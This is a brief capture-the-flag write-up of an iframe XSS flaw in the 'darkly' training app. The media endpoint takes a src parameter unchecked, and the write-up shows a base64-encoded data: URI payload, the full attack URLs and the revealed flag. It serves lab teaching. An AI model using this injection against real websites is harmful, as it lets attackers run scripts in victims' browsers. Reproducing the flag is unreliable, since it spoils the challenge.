Exploit — XSS Iframe Hijacking

Vulnerability Overview

The /index.php?page=media endpoint expects a src query‑parameter and blindly copies its value into the src attribute of an <iframe>. Because no validation, encoding, or Content‑Security‑Policy (CSP) is applied, an attacker can supply a data: URI whose payload is arbitrary HTML/JavaScript. When the browser renders the page the malicious script executes in the origin of darkly, granting full DOM access and, in the CTF environment, exposing the flag.

PAYLOAD='<script>alert("Hacked")</script>'
echo -n "$PAYLOAD" | base64 # → PHNjcmlwdD5hbGVydCgiSGFja2VkIik8L3NjcmlwdD4=


http://$TARGET_IP/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGFja2VkIik8L3NjcmlwdD4=
http:/localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGFja2VkIik8L3NjcmlwdD4=


Navigating to the link executes the JavaScript and, in the challenge environment, causes the page to reveal the flag 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D.